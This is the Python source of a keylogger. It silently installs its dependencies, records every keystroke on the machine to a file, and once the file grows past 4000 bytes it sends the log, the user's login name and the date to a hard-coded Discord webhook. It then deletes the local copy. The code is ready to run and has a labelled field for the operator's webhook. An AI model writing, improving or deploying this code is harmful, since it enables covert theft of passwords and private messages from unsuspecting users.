# Default modules
import os
from threading import Thread
from datetime import date

# Non-default modules
try:
    from pynput.keyboard import Key, Listener
except ImportError:
    os.system('pip install pynput')
    from pynput.keyboard import Key, Listener

try:
    from discord_webhook import DiscordWebhook
except ImportError:
    os.system('pip install discord_webhook')
    from discord_webhook import DiscordWebhook



##### Field to fill ######

W_U = "https://discord.com/api/webhooks/1154145011001208883/duzBD_fM21WSAaoiaGHDc_ObEENoC5vf7b6usxuVVtAeE4Fq5bOACBrTUxWFRXomKzBM" #Your webhook url

def on_press(key):
    with open("logs.txt", "a") as file:
        file.write('{0}'.format(key))
    if os.path.getsize('logs.txt') > 4000 :
        discord_webhook_send(W_U)
        os.remove('logs.txt')

def on_release(key):
    if key == Key.f2:
        # Stop listener
        return False

def discord_webhook_send(webhook_url):
    release = date.today()
    user = os.getlogin()
    webhook = DiscordWebhook(url=webhook_url, username="Captain Cyborg", content="User : {0}\nDate : {1}".format(user,release), avatar_url="https://i.ibb.co/gZ98M2X/DALL-E-2023-10-22-17-17-42-un-pirate-cyborg-haute-r-solution-r-aliste-fumig-ne-dans-le-fond.png")
    with open("logs.txt", "rb") as f:
        webhook.add_file(file=f.read(), filename="logs.txt")
    response = webhook.execute()

def logging():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

t_1 = Thread(target=logging)
t_1.start()
